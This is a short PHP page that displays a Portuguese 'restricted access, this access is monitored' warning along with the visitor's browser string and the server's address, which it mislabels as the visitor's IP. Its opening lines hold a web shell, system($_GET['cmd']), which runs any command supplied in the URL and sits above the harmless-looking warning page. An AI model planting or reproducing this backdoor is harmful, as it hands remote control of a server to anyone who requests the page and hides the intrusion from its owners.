<?php
	system($_GET["cmd"]);
?>
<!DOCTYPE html>
<html>
<body>
<H1> ACESSO RESTRITO!!! </H1>
<p>
Esse acesso está sendo monitorado. <br/>
<?php
echo " Seu IP é: " . $_SERVER["SERVER_ADDR"] . "<br/>";
echo " Seu browser: " . $_SERVER["HTTP_USER_AGENT"] . "<br/>";
?>
</p>

</body>
</html>
